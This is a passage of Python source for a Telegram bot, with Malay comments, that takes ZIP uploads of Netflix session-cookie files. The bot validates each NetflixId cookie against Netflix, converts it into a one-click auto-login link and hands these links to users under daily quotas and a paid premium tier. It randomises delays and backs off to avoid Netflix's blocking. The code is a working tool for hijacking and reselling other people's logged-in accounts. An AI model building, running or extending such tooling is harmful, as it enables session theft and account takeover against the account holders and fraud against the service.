    Return (saved, skipped, failed, errors_list)
    """
    saved = 0
    skipped = 0
    failed = 0
    errors = []

    os.makedirs(COOKIE_FOLDER, exist_ok=True)

    try:
        zf = zipfile.ZipFile(zip_path, "r")
    except zipfile.BadZipFile:
        return 0, 0, 0, ["Invalid ZIP file"]
    except Exception as exc:
        return 0, 0, 0, [f"ZIP open failed: {exc}"]

    try:
        for info in zf.infolist():
            if info.is_dir():
                continue

            # Zip Slip protection — ambil basename sahaja
            raw_name = info.filename.replace("\\", "/")
            fname = os.path.basename(raw_name)

            if not fname or fname in (".", ".."):
                skipped += 1
                continue

            if not fname.lower().endswith(".txt"):
                skipped += 1
                continue

            if "premium" not in fname.lower():
                skipped += 1
                continue

            # Read content from zip
            try:
                with zf.open(info) as src:
                    raw_bytes = src.read()
            except Exception:
                failed += 1
                errors.append(f"{fname}: read fail")
                continue

            try:
                content = raw_bytes.decode("utf-8", errors="ignore").strip()
            except Exception:
                failed += 1
                errors.append(f"{fname}: decode fail")
                continue

            if not content:
                failed += 1
                errors.append(f"{fname}: empty")
                continue

            # Validate NetflixId
            cookie_dict = extract_cookie_dict(content)
            if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
                failed += 1
                errors.append(f"{fname}: no NetflixId")
                continue

            # Save (overwrite)
            dest = os.path.join(COOKIE_FOLDER, fname)
            try:
                with open(dest, "w", encoding="utf-8") as fh:
                    fh.write(content)
                saved += 1
                log(f"[UPLOAD] Saved {fname}")
            except Exception:
                failed += 1
                errors.append(f"{fname}: write fail")
    finally:
        zf.close()

    return saved, skipped, failed, errors


# ==================== CORE ====================
def try_valid_folder(user_id):
    """
    Laluan pantas /get: ambil cookie dari folder valid/ (dah disemak penuh
    oleh background checker) — cuma fetch token FTL, tiada semakan web.
    Return tuple result try_get_login_url kalau berjaya, None kalau valid
    habis / bermasalah → caller sambung raw flow.
    """
    vfiles = get_valid_files()
    if not vfiles:
        return None

    for fname in random.sample(vfiles, len(vfiles)):
        path = os.path.join(VALID_FOLDER, fname)
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read().strip()
        except Exception:
            remove_from_valid(fname, "read failed")
            continue
        if not content:
            remove_from_valid(fname, "empty file")
            continue

        # Elak duplicate URL harian
        if ONE_URL_PER_ACCOUNT_PER_DAY and is_served_today(fname):
            log(f"[VALID-SKIP] {fname} — served hari ini")
            continue

        cookie_dict = extract_cookie_dict(content)
        if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
            remove_from_valid(fname, "no NetflixId")
            continue

        try:
            token, expires = fetch_nftoken(cookie_dict)
        except BadAccountError as exc:
            remove_from_valid(fname, exc.reason)
            continue
        except requests.HTTPError as exc:
            code = exc.response.status_code if exc.response is not None else 0
            if code in (403, 429):
                log(f"[VALID] FTL HTTP {code} — fallback raw flow (file kept)")
                return None  # Netflix block → jangan buang; raw flow urus streak
            remove_from_valid(fname, f"HTTP {code}")
            continue
        except ValueError:
            remove_from_valid(fname, "no token (dead)")
            continue
        except Exception as exc:
            log(f"[VALID] fetch gagal ({type(exc).__name__}) — fallback raw flow")
            return None  # network glitch → jangan buang

        if is_expired(expires):
            remove_from_valid(fname, "expired")
            continue

        url = build_nftoken_link(token)
        if ONE_URL_PER_ACCOUNT_PER_DAY:
            today = _today_str()
            if any(
                v.get("url") == url and v.get("date") == today
                for v in load_served().values()
            ):
                log(f"[VALID-SKIP] {fname} — duplicate URL (account dah diberi)")
                continue
            mark_served(fname, user_id, url)

        info = parse_cookie_filename_info(fname)
        return True, url, expires, None, fname, info

    return None


def try_get_login_url(max_attempts=15, user_id=None):
    # 1) Laluan pantas: folder valid (dah disemak penuh oleh checker)
    result = try_valid_folder(user_id)
    if result is not None:
        return result

    # 2) Folder valid habis / bermasalah → raw flow dengan semakan penuh
    reasons = []
    served_skips = 0
    block_streak = 0  # berapa kali berturut-turut Netflix block semakan kita

    def _note_blocked(detail):
        """Rekod streak Netflix block; return True kalau dah sampai had."""
        nonlocal block_streak
        block_streak += 1
        log(f"[BLOCKED] streak {block_streak}/{MAX_CONSECUTIVE_BLOCKED} — {detail}")
        return block_streak >= MAX_CONSECUTIVE_BLOCKED

    txt_files = get_cookie_files()
    if not txt_files:
        return False, None, None, "No cookie files in NetCookie folder.", None, None

    tried = set()
    total = len(txt_files)

    while len(tried) < total and len(tried) < max_attempts:
        remaining = [f for f in txt_files if f not in tried]
        if not remaining:
            break
        chosen_file = random.choice(remaining)
        tried.add(chosen_file)
        chosen_path = os.path.join(COOKIE_FOLDER, chosen_file)

        # --- Elak duplicate URL: skip account yang dah diberi hari ini ---
        if ONE_URL_PER_ACCOUNT_PER_DAY and is_served_today(chosen_file):
            served_skips += 1
            continue

        # --- Read file ---
        try:
            with open(chosen_path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read().strip()
        except Exception:
            log(f"[SKIP] {chosen_file} — read failed (file kept)")
            continue

        if not content:
            log(f"[SKIP] {chosen_file} — empty file (file kept)")
            continue

        # --- Delay kecil antara semakan (elak Netflix block) ---
        time.sleep(random.uniform(*CHECK_DELAY_RANGE))

        # --- Semakan penuh: web (/account + /membership) + playback + token FTL ---
        status, reason, _cd, token, expires = verify_cookie_content(content)

        if status == "blocked":
            if _note_blocked(f"{chosen_file}: {reason}"):
                return False, None, None, BLOCKED_MSG, None, None
            continue

        if status in ("dead", "bad"):
            block_streak = 0
            reasons.append(reason or status)
            if AUTO_REMOVE_BAD_ACCOUNT:
                _remove_bad_cookie(chosen_path, reason or status)
            else:
                log(f"[SKIP] {chosen_file} — {reason} (file kept)")
            continue

        if status == "error":
            block_streak = 0
            reasons.append(reason or "error")
            log(f"[SKIP] {chosen_file} — {reason} (file kept)")
            continue

        # Netflix respon baik → reset streak rate-limit
        block_streak = 0

        # --- Check expiry ---
        if is_expired(expires):
            reasons.append("expired")
            log(f"[SKIP] {chosen_file} — expired token (file kept)")
            continue

        # SUCCESS → rekod supaya account ni tak diberi lagi (elak duplicate URL)
        url = build_nftoken_link(token)
        if ONE_URL_PER_ACCOUNT_PER_DAY:
            today = _today_str()
            if any(
                v.get("url") == url and v.get("date") == today
                for v in load_served().values()
            ):
                reasons.append("duplicate URL (same account, another file)")
                log(f"[SKIP] {chosen_file} — duplicate URL (same account already served today)")
                continue
            mark_served(chosen_file, user_id, url)

        info = parse_cookie_filename_info(chosen_file)
        return True, url, expires, None, chosen_file, info

    if not reasons and served_skips:
        return False, None, None, "All accounts already used today. Try again tomorrow.", None, None
    summary = "; ".join(reasons[-3:]) if reasons else "unknown"
    return False, None, None, f"No valid account. Reason: {summary}", None, None


# ==================== BACKGROUND CHECKER ====================
_checker_backoff_until = 0.0
_bg_task = None


def run_checker_cycle(batch=CHECKER_BATCH):
    """
    Satu kitaran background checker: semak sehingga `batch` account raw.
    Lulus → pindah ke valid/. Gagal semakan → buang (AUTO_REMOVE) atau
    tanda bad_checked. Netflix block → berhenti kitaran + backoff.
    Return stats dict (untuk log & notifikasi stok rendah).
    """
    global _checker_backoff_until
    stats = {
        "checked": 0, "valid": 0, "removed": 0, "backoff": False,
        "raw": len(get_cookie_files()), "valid_total": len(get_valid_files()),
        "alert_raw": None,
    }

    if time.time() < _checker_backoff_until:
        stats["backoff"] = True
        return stats

    # Fail yang dah served hari ini / dah disemak-gagal hari ni → skip
    raw_files = [
        f for f in get_cookie_files()
        if not (ONE_URL_PER_ACCOUNT_PER_DAY and is_served_today(f))
        and not is_bad_checked_today(f)
    ]
    if not raw_files:
        return stats

    picked = random.sample(raw_files, min(batch, len(raw_files)))
    for fname in picked:
        path = os.path.join(COOKIE_FOLDER, fname)
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read().strip()
        except Exception:
            log(f"[CHECKER] {fname} — read failed (file kept)")
            continue
        if not content:
            log(f"[CHECKER] {fname} — empty file (file kept)")
            continue

        time.sleep(random.uniform(*CHECK_DELAY_RANGE))
        stats["checked"] += 1
        status, reason, _cd, token, expires = verify_cookie_content(content)

        if status == "ok":
            if move_to_valid(path):
                stats["valid"] += 1
            continue

        if status == "blocked":
            _checker_backoff_until = time.time() + CHECKER_BACKOFF_SECONDS
            log(f"[CHECKER] Netflix block ({reason}) — backoff {CHECKER_BACKOFF_SECONDS}s")
            break

        if status in ("dead", "bad"):
            if AUTO_REMOVE_BAD_ACCOUNT:
                _remove_bad_cookie(path, reason or status)
                stats["removed"] += 1
            else:
                mark_bad_checked(fname)
                log(f"[CHECKER] {fname} — {reason} (file kept)")
            continue

        # error → biar, cuba kitaran seterusnya (mungkin glitch sementara)
        log(f"[CHECKER] {fname} — {reason} (file kept)")

    stats["raw"] = len(get_cookie_files())
    stats["valid_total"] = len(get_valid_files())

    # Notif stok raw rendah — sekali sehari sahaja (elak spam)
    if stats["raw"] <= RAW_STOCK_ALERT_THRESHOLD:
        last = None
        try:
            if os.path.exists(RAW_STOCK_ALERT_FILE):
                with open(RAW_STOCK_ALERT_FILE, "r", encoding="utf-8") as fh:
                    last = json.load(fh).get("date")
        except Exception:
            last = None
        if last != _today_str():
            try:
                with open(RAW_STOCK_ALERT_FILE, "w", encoding="utf-8") as fh:
                    json.dump({"date": _today_str()}, fh)
                stats["alert_raw"] = stats["raw"]
            except Exception as exc:
                log(f"[CHECKER] Gagal simpan alert: {exc}")

    return stats


async def background_checker(app):
    """Kerja belakang: pre-check account raw setiap CHECKER_INTERVAL saat."""
    if not CHECKER_ENABLED:
        return
    await asyncio.sleep(10)  # beri bot masa nak mula dulu
    while True:
        try:
            stats = await asyncio.to_thread(run_checker_cycle)
        except Exception as exc:
            log(f"[CHECKER] ralat kitaran: {exc}")
            stats = None
        if stats:
            log(
                f"[CHECKER] semak={stats['checked']} valid+={stats['valid']} "
                f"buang={stats['removed']} raw={stats['raw']} valid={stats['valid_total']}"
            )
            if stats.get("alert_raw") is not None:
                text = (
                    f"Stock raw rendah: {stats['raw']} fail "
                    f"(ambang {RAW_STOCK_ALERT_THRESHOLD}).\n"
                    f"Valid pool: {stats['valid_total']}.\n"
                    f"Upload cookie baru dengan /upload."
                )
                for oid in OWNER_IDS:
                    try:
                        await app.bot.send_message(chat_id=oid, text=text)
                    except Exception as exc:
                        log(f"[CHECKER] Notif gagal ke {oid}: {exc}")
        await asyncio.sleep(CHECKER_INTERVAL)


async def _post_init(app):
    """Mula background checker lepas bot siap."""
    global _bg_task
    _bg_task = asyncio.create_task(background_checker(app))


# ==================== HELPERS ====================
def is_owner(user_id):
    return user_id in OWNER_IDS


def mask_id(uid):
    s = str(uid)
    if len(s) <= 6:
        return s
    return f"{s[:4]}***{s[-2:]}"


def mask_email(email):
    if not email or "@" not in email:
        return email
    local, domain = email.split("@", 1)
    if len(local) > 3:
        return f"{local[:3]}***@{domain}"
    elif len(local) > 0:
        return f"{local[0]}***@{domain}"
    return email


def scan_limit_log(log_path, today):
    """
    Scan bot.log untuk event rate-limit pada tarikh `today` (YYYY-MM-DD).
    Dipakai oleh /checklimit — pilihan C: pantau log sebelum naik pilihan A.
    Return (stats_dict, last_blocked_line). Guna elif supaya satu baris tak
    dikira dua kali (baris [BLOCKED] pun boleh bawa "HTTP 403" dalam detail).
    """
    stats = {
        "blocked": 0, "http403": 0, "http429": 0,
        "backoff": 0, "getok": 0, "getfail_blocked": 0,
    }
    last_blocked = None
    prefix = f"[{today}"
    try:
        with open(log_path, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                if not line.startswith(prefix):
                    continue
                if "[BLOCKED]" in line:
                    stats["blocked"] += 1
                    last_blocked = line.strip()
                elif "[CHECKER] Netflix block" in line:
                    stats["backoff"] += 1
                elif "HTTP 403" in line:
                    stats["http403"] += 1
                elif "HTTP 429" in line:
                    stats["http429"] += 1
                elif "[GET-OK]" in line:
                    stats["getok"] += 1
                elif "[GET-FAIL]" in line and "Netflix is blocking" in line:
                    stats["getfail_blocked"] += 1
    except Exception:
        pass
    return stats, last_blocked


def build_main_menu():
    keyboard = [
        [
            InlineKeyboardButton("Get URL", callback_data="menu_get"),
            InlineKeyboardButton("My Quota", callback_data="menu_quota"),
        ],
        [
            InlineKeyboardButton("Premium", callback_data="menu_premium"),
            InlineKeyboardButton("Stats", callback_data="menu_stats"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def build_url_message(url, expires, info):
    """Mesej ringkas dengan garis perantaraan; link boleh copy sekali klik."""
    sep = "──────────────────────"
    return (
        f"<b>NETFLIX LOGIN</b>\n"
        f"{sep}\n\n"
        f"Plan: <b>{info['plan']}</b>\n"
        f"Expiry: <b>{format_expiry(expires)}</b>\n\n"
        f"{sep}\n"
        f"Login link (tekan sekali untuk copy):\n"
        f"<code>{html.escape(url)}</code>\n"
        f"{sep}\n\n"
        f"Arahan: Buka link dalam Safari (iPhone) / Chrome (Android),\n"
        f"lepas tu tekan Open App untuk auto-login.\n"
        f"Smart TV: login dulu kat phone, pastu masukkan kod kat netflix.com/tv2."
    )


# ==================== USER HANDLERS ====================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    remaining = get_remaining(user.id)

    if is_owner(user.id):
        tag = " (owner)"
        status = "Account: Owner — unlimited quota"
    elif is_premium(user.id):
        tag = " (premium)"
        status = "Account: Premium — unlimited quota"
    else:
        tag = ""
        status = f"Remaining quota today: {remaining}/{DAILY_LIMIT}"

    text = (
        f"Hi {user.first_name}{tag}.\n"
        f"Netflix login URL generator.\n\n"
        f"{status}\n\n"
        f"Commands:\n"
        f"/get - Get login URL\n"
        f"/quota - Check quota\n"
        f"/stats - Bot statistics\n"
        f"/premium - Premium info\n"
    )
    if is_owner(user.id):
        text += (
            f"\nOwner commands:\n"
            f"/upload - Upload ZIP of cookies\n"
            f"/cancel_upload - Cancel upload mode\n"
            f"/reload - Count cookie files\n"
            f"/checklimit - Rate-limit report\n"
            f"/reset_me - Reset own quota\n"
            f"/reset <user_id> - Reset user quota\n"
            f"/reset_all - Reset all quotas\n"
            f"/reset_pool - Reset served pool\n"
            f"/broadcast <msg> - Send to all users\n"
            f"/admin_stats - Full statistics\n"
            f"/addpremium <user_id> - Add premium\n"
            f"/delpremium <user_id> - Remove premium\n"
            f"/listpremium - List premium users\n"
        )

    await update.message.reply_text(
        text,
        reply_markup=build_main_menu(),
    )


async def quota_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_owner(user.id):
        text = "Owner — unlimited quota."
    elif is_premium(user.id):
        text = "Premium — unlimited quota."
    else:
        remaining = get_remaining(user.id)
        text = f"Quota today: {remaining}/{DAILY_LIMIT}."
    await update.message.reply_text(
        text, reply_markup=build_main_menu(),
    )


async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_global_stats()
    total_files = len(get_cookie_files())
    text = (
        f"Bot statistics\n\n"
        f"Total users: {s['total_users']}\n"
        f"Active today: {s['today_users']}\n"
        f"Requests today: {s['today_requests']}\n"
        f"Cookie raw: {total_files}\n"
        f"Cookie valid: {len(get_valid_files())}"
    )
    await update.message.reply_text(
        text, reply_markup=build_main_menu(),
    )


async def _do_get_url(message, user):
    """Shared logic untuk /get dan button Get URL."""
    remaining_before = get_remaining(user.id)

    if remaining_before <= 0:
        await message.reply_text(
            f"Your quota is finished for today ({DAILY_LIMIT}/{DAILY_LIMIT}).\n"
            f"Type /premium for unlimited info.",
            reply_markup=build_main_menu(),
        )
        return

    msg = await message.reply_text("Generating URL...")

    success, url, expires, error, filename, info = try_get_login_url(max_attempts=15, user_id=user.id)

    if not success:
        log(f"[GET-FAIL] user={user.id} reason={error}")
        await msg.edit_text(
            f"Failed to get URL.\n\n"
            f"Reason: {error}\n\n"
            f"Quota not deducted. Remaining: {remaining_before}/{DAILY_LIMIT}.",
            reply_markup=build_main_menu(),
        )
        return

    consume_quota(user.id)
    log(f"[GET-OK] user={user.id} file={filename[:60]}")

    text = build_url_message(url, expires, info)

    await msg.edit_text(
        text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=build_main_menu(),
    )


async def get_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _do_get_url(update.message, update.effective_user)


async def premium_info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if is_owner(user.id):
        text = "You are the owner — quota unlimited."
    elif is_premium(user.id):
        text = "You are a premium user — quota unlimited. Use /get anytime."
    else:
        text = (
            "Premium\n\n"
            "- Unlimited quota, no daily limit\n"
            "- Use /get as much as you want\n\n"
            f"Contact the owner to get premium: {OWNER_USERNAME}"
        )

    await update.message.reply_text(
        text,
        disable_web_page_preview=True,
        reply_markup=build_main_menu(),
    )


# ==================== MENU CALLBACK ====================
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline menu button presses."""
    query = update.callback_query
    await query.answer()
    data = query.data
    user = update.effective_user

    if data == "menu_get":
        await _do_get_url(query.message, user)

    elif data == "menu_quota":
        if is_owner(user.id):
            text = "Owner — unlimited quota."
        elif is_premium(user.id):
            text = "Premium — unlimited quota."
        else:
            remaining = get_remaining(user.id)
            text = f"Quota today: {remaining}/{DAILY_LIMIT}."
        await query.message.reply_text(
            text,
            reply_markup=build_main_menu(),
        )

    elif data == "menu_premium":
        if is_owner(user.id):
            text = "You are the owner — quota unlimited."
        elif is_premium(user.id):
            text = "You are a premium user — quota unlimited. Use /get anytime."
        else:
            text = (
                "Premium\n\n"
                "- Unlimited quota, no daily limit\n"
                "- Use /get as much as you want\n\n"
                f"Contact the owner to get premium: {OWNER_USERNAME}"
            )
        await query.message.reply_text(
            text,
            disable_web_page_preview=True,
            reply_markup=build_main_menu(),
        )

    elif data == "menu_stats":
        s = get_global_stats()
        total_files = len(get_cookie_files())
        text = (
            f"Bot statistics\n\n"
            f"Total users: {s['total_users']}\n"
            f"Active today: {s['today_users']}\n"
            f"Requests today: {s['today_requests']}\n"
            f"Cookie raw: {total_files}\n"
            f"Cookie valid: {len(get_valid_files())}"
        )
        await query.message.reply_text(
            text,
            reply_markup=build_main_menu(),
        )


# ==================== OWNER HANDLERS ====================
def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not is_owner(user.id):
            await update.message.reply_text("This command is for owner only.")
            return
        return await func(update, context)
    return wrapper


@owner_only
async def upload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activate ZIP upload mode."""
    context.user_data["awaiting_zip"] = True
    await update.message.reply_text(
        "ZIP upload mode\n\n"
        "Send a .zip file containing cookie .txt files.\n\n"
        "Rules:\n"
        "- Only .txt files inside ZIP\n"
        "- Filename must contain 'premium'\n"
        "- Content must have NetflixId\n"
        "- Duplicate names overwritten\n"
        "- Files without 'premium' skipped\n\n"
        "Type /cancel_upload to cancel.",
    )


@owner_only
async def cancel_upload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel upload mode."""
    context.user_data.pop("awaiting_zip", None)
    await update.message.reply_text("Upload mode cancelled.")


async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming ZIP document from owner."""
    user = update.effective_user

    if not is_owner(user.id):
        return

    if not context.user_data.get("awaiting_zip"):
        return

    doc = update.message.document
    if not doc:
        return

    fname = doc.file_name or ""
    if not fname.lower().endswith(".zip"):
        await update.message.reply_text(
            "Please send a .zip file. Type /cancel_upload to cancel."
        )
        return

    # Reset flag immediately (one-shot)
    context.user_data.pop("awaiting_zip", None)

    msg = await update.message.reply_text("Downloading ZIP...")

    tmp_dir = tempfile.mkdtemp(prefix="cookie_zip_")
    zip_path = os.path.join(tmp_dir, "upload.zip")

    try:
        tg_file = await doc.get_file()
        await tg_file.download_to_drive(zip_path)
    except Exception as exc:
        log(f"[UPLOAD] Download failed: {exc}")
        await msg.edit_text(
            f"Download failed\n\n{exc}",
        )
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return

    await msg.edit_text("Extracting & validating...")

    try:
        saved, skipped, failed, errors = process_zip_upload(zip_path)
    except Exception as exc:
        log(f"[UPLOAD] Process failed: {exc}")
        await msg.edit_text(
            f"Extract failed\n\n{exc}",
        )
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return

    shutil.rmtree(tmp_dir, ignore_errors=True)

    total_now = len(get_cookie_files())
    log(f"[UPLOAD] user={user.id} saved={saved} skipped={skipped} failed={failed} total={total_now}")

    text = (
        f"Upload complete\n"
        f"Saved: {saved}\n"
        f"Skipped: {skipped}\n"
        f"Failed: {failed}\n"
        f"Total files: {total_now}"
    )

    if errors:
        preview = "\n".join(f"- {e}" for e in errors[:5])
        text += f"\n\nErrors (first 5):\n{preview}"
        if len(errors) > 5:
            text += f"\n... and {len(errors) - 5} more"

    await msg.edit_text(text)


@owner_only
async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = get_cookie_files()
    valid = len(get_valid_files())
    await update.message.reply_text(
        f"Cookie files\n"
        f"Raw (NetCookie/): {len(files)}\n"
        f"Valid (NetCookie/valid/): {valid}",
    )


@owner_only
async def checklimit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Pilihan C: pantau rate-limit — scan bot.log, kira event block hari ini."""
    stats, last_blocked = scan_limit_log(LOG_FILE, _today_str())
    text = (
        f"Rate-limit report (hari ini)\n\n"
        f"[BLOCKED] streak (/get raw): {stats['blocked']}\n"
        f"HTTP 403 (web/playback/valid): {stats['http403']}\n"
        f"HTTP 429: {stats['http429']}\n"
        f"Checker backoff (rehat 10 min): {stats['backoff']}\n"
        f"GET OK: {stats['getok']} | GET gagal sebab block: {stats['getfail_blocked']}"
    )
    if last_blocked:
        text += f"\n\nEvent terakhir:\n{last_blocked}"
    text += (
        f"\n\nNilai kecil / 0 = semuanya baik.\n"
        f"Kalau BLOCKED & backoff kerap naik dalam beberapa hari, "
        f"bilang aku — kita naik pilihan A (token reuse)."
    )
    await update.message.reply_text(text)


@owner_only
async def reset_me_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    reset_user_quota(user.id)
    await update.message.reply_text("Your quota has been reset.")


@owner_only
async def reset_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /reset <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return
    reset_user_quota(uid)
    await update.message.reply_text(
        f"Quota for user {uid} has been reset.",
    )


@owner_only
async def reset_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reset_all_quota()
    await update.message.reply_text("All quotas have been reset.")


@owner_only
async def reset_pool_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear served pool — semua cookie boleh diberi semula hari ini."""
    reset_served()
    await update.message.reply_text(
        "Served pool cleared. All cookies can be given again today."
    )


@owner_only
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = " ".join(context.args)
    data = load_usage()
    user_ids = list(data.keys())

    sent, failed = 0, 0
    for uid in user_ids:
        try:
            await context.bot.send_message(chat_id=int(uid), text=message)
            sent += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"Broadcast complete.\nSent: {sent}\nFailed: {failed}"
    )


@owner_only
async def admin_stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_global_stats()
    files = get_cookie_files()
    prem = load_premium()
    data = load_usage()
    today = _today_str()
    served_today = sum(1 for v in load_served().values() if v.get("date") == today)

    today_entries = [
        (uid, v.get("count", 0)) for uid, v in data.items() if v.get("date") == today
    ]
    today_entries.sort(key=lambda x: x[1], reverse=True)
    top5 = today_entries[:5]

    top5_text = "\n".join(
        f"- {mask_id(uid)} — {count} req" for uid, count in top5
    ) or "- (none)"

    text = (
        f"Admin stats\n\n"
        f"Total users: {s['total_users']}\n"
        f"Active today: {s['today_users']}\n"
        f"Requests today: {s['today_requests']}\n"
        f"Cookie raw: {len(files)}\n"
        f"Cookie valid: {len(get_valid_files())}\n"
        f"Served today: {served_today}\n"
        f"Premium users: {len(prem)}\n"
        f"Owners: {len(OWNER_IDS)}\n\n"
        f"Top 5 today:\n{top5_text}"
    )
    await update.message.reply_text(text)


@owner_only
async def add_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /addpremium <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return

    add_premium(uid)
    await update.message.reply_text(
        f"User {uid} is now Premium. Quota: unlimited.",
    )

    try:
        await context.bot.send_message(
            chat_id=uid,
            text=(
                "Congratulations! You are now a premium user.\n"
                "Your quota is unlimited. Use /get as much as you want."
            ),
        )
    except Exception:
        pass


@owner_only
async def del_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /delpremium <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return

    remove_premium(uid)
    await update.message.reply_text(
        f"Premium removed for user {uid}.\n"
        f"Quota back to {DAILY_LIMIT}/day.",
    )


@owner_only
async def list_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prem = load_premium()
    if not prem:
        await update.message.reply_text("No premium users at the moment.")
        return

    lines = "\n".join(f"- {uid}" for uid in sorted(prem))
    await update.message.reply_text(
        f"Premium list ({len(prem)}):\n\n{lines}",
    )


# ==================== MAIN ====================
def main():
    log("Bot starting — running duplicate cleanup...")
    cleanup_duplicate_files()

    # Struktur: NetCookie/ = raw, NetCookie/valid/ = dah disemak (auto wujud masa start)
    os.makedirs(VALID_FOLDER, exist_ok=True)
    log("[START] Folder valid sedia: NetCookie/valid/")

    app = Application.builder().token(BOT_TOKEN).post_init(_post_init).build()

    # User
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("get", get_cmd))
    app.add_handler(CommandHandler("quota", quota_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("premium", premium_info_cmd))

    # Owner — upload ZIP
    app.add_handler(CommandHandler("upload", upload_cmd))
    app.add_handler(CommandHandler("cancel_upload", cancel_upload_cmd))
    app.add_handler(
        MessageHandler(filters.Document.FileExtension("zip"), document_handler)
    )

    # Owner — others
    app.add_handler(CommandHandler("reload", reload_cmd))
    app.add_handler(CommandHandler("checklimit", checklimit_cmd))
    app.add_handler(CommandHandler("reset_me", reset_me_cmd))
    app.add_handler(CommandHandler("reset", reset_user_cmd))
    app.add_handler(CommandHandler("reset_all", reset_all_cmd))
    app.add_handler(CommandHandler("reset_pool", reset_pool_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("admin_stats", admin_stats_cmd))
    app.add_handler(CommandHandler("addpremium", add_premium_cmd))
    app.add_handler(CommandHandler("delpremium", del_premium_cmd))
    app.add_handler(CommandHandler("listpremium", list_premium_cmd))

    # Inline menu
    app.add_handler(CallbackQueryHandler(menu_callback))

    log("Bot running...")
    print("Bot running... Press Ctrl+C to stop.")
    app.run_polling()


if __name__ == "__main__":
    main()